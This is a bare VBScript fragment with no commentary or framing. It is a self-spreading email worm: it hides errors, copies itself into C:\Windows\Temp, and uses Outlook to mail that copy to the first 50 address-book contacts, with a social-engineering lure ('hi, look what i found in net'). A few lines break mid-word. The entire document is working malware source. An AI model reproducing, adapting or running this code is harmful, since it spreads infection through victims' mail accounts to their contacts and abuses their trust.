   On Error Resume Next
   Dim x
   Set so=CreateObject("Scripting.FileSystemObject")
   so.GetFile(WScript.ScriptFullName).Copy("C:\Windows\
   Temp\TEMP_54513.vbs")
   Set ol=CreateObject("Outlook.Application")
   For x=1 To 50
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).Addr
   essEntries(x)
   Mail.Subject="hey"
   Mail.Body="hi, look what i found in net"
   Mail.Attachments.Add("C:\Windows\Temp\TEMP_54513.
   vbs")
   Mail.Send
   Next
   ol.Quit
